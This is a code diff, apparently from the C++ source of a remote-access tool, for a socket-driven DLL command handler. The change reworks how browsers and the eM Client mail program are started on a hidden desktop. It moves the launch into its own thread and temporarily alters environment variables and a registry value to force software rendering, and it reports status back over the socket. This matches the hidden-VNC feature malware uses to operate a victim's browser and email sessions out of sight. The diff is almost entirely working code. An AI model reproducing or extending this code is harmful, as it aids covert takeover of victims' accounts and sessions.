@@ -2494,53 +2494,63 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     si.dwFlags      = STARTF_USESHOWWINDOW;
                     si.wShowWindow  = SW_SHOWNORMAL;
 
-                    PROCESS_INFORMATION pi = { 0 };
+                    // Spawn a pristine thread to guarantee SetThreadDesktop succeeds 100%
+                    // before calling CreateProcessW so that grandchild processes are correctly
+                    // created on the hidden desktop context.
+                    thread([cmdLine, si, isGecko, wRequestedPath]() {
+                        ensure_desktop();
+                        if (!g_hHiddenDesktop) return;
 
-                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
-                    if (g_hHiddenDesktop) {
-                        SetThreadDesktop(g_hHiddenDesktop);
-                    }
-
-                    if (isGecko) {
-                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
-                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
-                    }
-
-                    bool isEMClient = (wRequestedPath == L"eM Client");
-                    bool hasOldVal = false;
-                    DWORD oldVal = 0;
-                    if (isEMClient) {
-                        hasOldVal = read_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
-                        write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
-                    }
-
-                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
-                        CloseHandle(pi.hProcess);
-                        CloseHandle(pi.hThread);
-                        request_full_frame(true);
-                        send_status("Browser started on hidden desktop");
-                    } else {
-                        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
-                    }
-
-                    if (isEMClient) {
-                        Sleep(500);
-                        if (hasOldVal) {
-                            write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
-                        } else {
-                            delete_registry_value(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
+                        HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
+                        if (g_hHiddenDesktop) {
+                            SetThreadDesktop(g_hHiddenDesktop);
                         }
-                    }
 
-                    if (isGecko) {
-                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
-                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
-                    }
+                        if (isGecko) {
+                            SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
+                            SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
+                        }
 
-                    if (hCurrentDesktop) {
-                        SetThreadDesktop(hCurrentDesktop);
-                    }
+                        bool isEMClient = (wRequestedPath == L"eM Client");
+                        bool hasOldVal = false;
+                        DWORD oldVal = 0;
+                        if (isEMClient) {
+                            hasOldVal = read_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
+                            write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
+                        }
+
+                        PROCESS_INFORMATION pi = { 0 };
+                        vector<wchar_t> cmdLineWriteable(cmdLine.begin(), cmdLine.end());
+                        cmdLineWriteable.push_back(L'\0');
+
+                        if (CreateProcessW(NULL, cmdLineWriteable.data(), NULL, NULL, FALSE,
+                                           0, NULL, NULL, (STARTUPINFOW*)&si, &pi)) {
+                            CloseHandle(pi.hProcess);
+                            CloseHandle(pi.hThread);
+                            request_full_frame(true);
+                            send_status("Browser started on hidden desktop");
+                        } else {
+                            send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                        }
+
+                        if (isEMClient) {
+                            Sleep(800);
+                            if (hasOldVal) {
+                                write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
+                            } else {
+                                delete_registry_value(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
+                            }
+                        }
+
+                        if (isGecko) {
+                            SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
+                            SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                        }
+
+                        if (hCurrentDesktop) {
+                            SetThreadDesktop(hCurrentDesktop);
+                        }
+                    }).join();
                 }).detach();
             } else {
                 thread([wRequestedPath]() {
